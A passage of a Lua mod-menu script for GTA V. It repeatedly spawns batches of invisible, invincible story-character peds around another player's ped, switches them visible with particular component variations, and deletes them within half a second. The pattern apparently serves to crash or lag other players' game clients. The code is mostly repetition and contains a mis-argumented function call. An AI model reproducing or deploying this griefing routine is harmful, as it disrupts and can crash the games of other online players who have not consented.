                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds3[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_solomon")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds4 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds4[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_stevehains")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds5 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds5[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_taostranslator")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds6 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds6[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_debra")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds7 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds7[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_guadalope")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds9 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds9[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_gurk")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds10 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds10[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_jimmydisanto")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds11 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds11[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_josh")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds12 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds12[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lamardavis")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds13 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds13[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds14 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds14[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest_3")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds15 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds15[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_martinmadrazo")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds16 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds16[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_milton")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds17 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds17[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_molly")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds18 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
